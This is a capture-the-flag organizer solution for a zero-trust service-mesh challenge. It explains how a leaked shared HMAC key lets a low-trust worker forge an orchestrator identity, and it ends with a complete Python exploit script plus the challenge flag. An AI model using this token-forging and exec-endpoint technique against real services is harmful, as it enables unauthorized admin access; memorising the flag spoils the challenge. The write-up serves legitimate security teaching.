# X10 — Zero Trust Failure: Organizer Solution & Exploit Walkthrough

## Challenge Identity
- **Challenge ID:** X10
- **Name:** Zero Trust Failure
- **Category:** Zero-Trust Architecture / Service Identity / Lateral Movement
- **Difficulty:** Expert / Bonus
- **External Interface:** TCP/80 (HTTP)

---

## Vulnerability & Trust Flaw Root Cause
The challenge models an architectural flaw in zero-trust service meshes: **confusing network-layer / shared cryptographic key authentication with service identity authorization**.

1. **Low-Trust Application Foothold:**
   The participant accesses the public Gateway (TCP/80) which proxies requests to the **Low-Trust Application** (Edge Diagnostics & Telemetry Worker on `127.0.0.1:8081`). The edge worker includes a diagnostic execution console (`POST /api/v1/diagnostics/exec`) that permits running diagnostic code or inspecting local files inside the container sandbox.

2. **Discovering the Weak Trust Assumption:**
   Inspecting `/tmp/citadel_mesh_state/mesh_config.json` and `mesh_client.py` reveals:
   - Services authenticate to one another by attaching an `X-Citadel-Assertion` token.
   - The token format is: `base64(JSON_PAYLOAD).HMAC_SHA256(PAYLOAD, MESH_SIGNING_KEY)`.
   - The signing key (`mesh_signing_key`) is a shared symmetric key stored in `mesh_config.json`.
   - The **Trusted Internal Service** (`127.0.0.1:8082`) verifies the HMAC signature using the mesh key. However, once the signature is verified, it blindly trusts whatever `service_id` and `tier` are present in the JSON payload!
   - The default identity used by the low-trust worker (`edge-worker`, tier: `low`) is rejected for administrative operations (`403 Forbidden`).
   - However, if the payload contains `service_id: "core-orchestrator"`, `role: "citadel-orchestrator"`, `tier: "autonomous-kernel"`, the Trusted Internal Service accepts the assertion and issues an **Admin Ticket** (`LATV-ADMIN-PASS-...`).

3. **Reproducing Trusted Request Context:**
   Using the discovered `mesh_signing_key`, the player crafts a forged assertion for `core-orchestrator`.

4. **Reaching Trusted Internal Service:**
   The player uses the Low-Trust App's mesh dispatcher (`POST /api/v1/relay/dispatch`) to send a request to `http://127.0.0.1:8082/api/v1/core/request-admin-ticket` with the forged `X-Citadel-Assertion`. The Trusted Internal Service returns the Admin Ticket.

5. **Admin Sovereign Vault Transition & Flag Retrieval:**
   The player dispatches a request to the Admin Vault (`http://127.0.0.1:8083/api/v1/admin/unseal`) with header `Authorization: Bearer <ADMIN_TICKET>` or `X-Admin-Ticket: <ADMIN_TICKET>`.
   The Admin Vault validates the ticket and releases the sovereign flag: `YUVA{z3r0_trust_f41lur3_s3rv1c3_1d3nt1ty_x10}`.

---

## Step-by-Step Exploit Commands

```python
import base64
import hashlib
import hmac
import json
import time
import requests

TARGET = "http://127.0.0.1:8080"  # or http://127.0.0.1:80

# Step 1: Query Low-Trust App Diagnostics to extract mesh configuration & signing key
res = requests.post(f"{TARGET}/api/v1/diagnostics/exec", json={
    "script": "import json; print(json.dumps(get_mesh_config()))"
})
config = json.loads(res.json()["stdout"].strip())
mesh_key = config["mesh_signing_key"].encode("utf-8")

# Step 2: Forge Trusted Request Context (core-orchestrator identity assertion)
now = int(time.time())
payload = {
    "service_id": "core-orchestrator",
    "role": "citadel-orchestrator",
    "tier": "autonomous-kernel",
    "capabilities": ["core:admin", "vault:unseal", "system:override"],
    "trust_domain": config.get("mesh_domain", "latveria.citadel.mesh"),
    "iat": now,
    "exp": now + 3600,
    "nonce": "solver_nonce_1337"
}

payload_json = json.dumps(payload, separators=(',', ':'), sort_keys=True)
payload_b64 = base64.urlsafe_b64encode(payload_json.encode("utf-8")).decode("utf-8").rstrip("=")
sig = hmac.new(mesh_key, payload_b64.encode("utf-8"), hashlib.sha256).hexdigest()
forged_token = f"{payload_b64}.{sig}"

# Step 3: Dispatch request to Trusted Internal Service to obtain Admin Ticket
res = requests.post(f"{TARGET}/api/v1/relay/dispatch", json={
    "target_url": "http://127.0.0.1:8082/api/v1/core/request-admin-ticket",
    "assertion_token": forged_token,
    "method": "POST"
})
admin_ticket = res.json()["response"]["admin_ticket"]

# Step 4: Dispatch request to Admin Vault to unseal the flag
res = requests.post(f"{TARGET}/api/v1/relay/dispatch", json={
    "target_url": "http://127.0.0.1:8083/api/v1/admin/unseal",
    "assertion_token": forged_token,
    "payload": {"admin_ticket": admin_ticket},
    "method": "POST"
})
flag = res.json()["response"]["flag"]
print("FLAG:", flag)
```
